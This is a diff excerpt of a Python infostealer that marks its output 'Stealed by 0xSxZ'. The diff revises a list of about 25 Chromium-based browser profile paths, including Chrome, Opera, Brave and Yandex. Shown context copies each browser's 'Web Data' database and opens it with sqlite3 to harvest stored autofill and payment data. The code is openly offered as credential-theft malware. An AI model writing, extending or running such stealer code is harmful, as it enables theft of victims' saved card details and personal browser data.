@@ -68,31 +68,31 @@ currency = "=========Stealed by 0xSxZ =============\n\n"
 local_appdata = os.environ['LOCALAPPDATA'] + "\\"
 default_appdata = os.getenv('APPDATA')
 chromiumpaths = [
-	default_appdata + "\\Opera Software\\Opera Stable",
-	default_appdata + "\\Opera Software\\Opera GX Stable",
-	local_appdata + "Google\\Chrome\\User Data",
-	local_appdata + "Google(x86)\\Chrome\\User Data",
-	local_appdata + "Chromium\\User Data",
-	local_appdata + "BraveSoftware\\Brave-Browser\\User Data",
-	local_appdata + "Epic Privacy Browser\\User Data",
-	local_appdata + "Amigo\\User Data",
-	local_appdata + "Vivaldi\\User Data",
-	local_appdata + "Orbitum\\User Data",
-	local_appdata + "Mail.Ru\\Atom\\User Data",
-	local_appdata + "Kometa\\User Data",
-	local_appdata + "Comodo\\Dragon\\User Data",
-	local_appdata + "Torch\\User Data",
-	local_appdata + "Comodo\\User Data",
-	local_appdata + "Slimjet\\User Data",
-	local_appdata + "360Browser\\Browser\\User Data",
-	local_appdata + "Maxthon3\\User Data",
-	local_appdata + "K-Melon\\User Data",
-	local_appdata + "Sputnik\\Sputnik\\User Data",
-	local_appdata + "Nichrome\\User Data",
-	local_appdata + "CocCoc\\Browser\\User Data",
-	local_appdata + "uCozMedia\\Uran\\User Data",
-	local_appdata + "Chromodo\\User Data",
-	local_appdata + "Yandex\\YandexBrowser\\User Data"
+	default_appdata + "\\Opera Software\\Opera Stable\\User Data\\Default",
+	default_appdata + "\\Opera Software\\Opera GX Stable\\User Data\\Default",
+	local_appdata + "Google\\Chrome\\User Data\\Default\\Default",
+	local_appdata + "Google(x86)\\Chrome\\User Data\\Default\\Default",
+	local_appdata + "Chromium\\User Data\\Default\\Default",
+	local_appdata + "BraveSoftware\\Brave-Browser\\User Data\\Default",
+	local_appdata + "Epic Privacy Browser\\User Data\\Default",
+	local_appdata + "Amigo\\User Data\\Default",
+	local_appdata + "Vivaldi\\User Data\\Default",
+	local_appdata + "Orbitum\\User Data\\Default",
+	local_appdata + "Mail.Ru\\Atom\\User Data\\Default",
+	local_appdata + "Kometa\\User Data\\Default",
+	local_appdata + "Comodo\\Dragon\\User Data\\Default",
+	local_appdata + "Torch\\User Data\\Default",
+	local_appdata + "Comodo\\User Data\\Default",
+	local_appdata + "Slimjet\\User Data\\Default",
+	local_appdata + "360Browser\\Browser\\User Data\\Default",
+	local_appdata + "Maxthon3\\User Data\\Default",
+	local_appdata + "K-Melon\\User Data\\Default",
+	local_appdata + "Sputnik\\Sputnik\\User Data\\Default",
+	local_appdata + "Nichrome\\User Data\\Default",
+	local_appdata + "CocCoc\\Browser\\User Data\\Default",
+	local_appdata + "uCozMedia\\Uran\\User Data\\Default",
+	local_appdata + "Chromodo\\User Data\\Default",
+	local_appdata + "Yandex\\YandexBrowser\\User Data\\Default"
 ]
 
 yes = "yes"
@@ -192,6 +192,7 @@ if yes == "yes":
 					if not os.path.exists(chromiumpaths[i]):
 						continue
 					path = str(chromiumpaths[i] + "\\Web Data")
+
 					shutil.copy(path, "webdata.db")
 					path = "webdata.db"
 					db = sqlite3.connect(path)
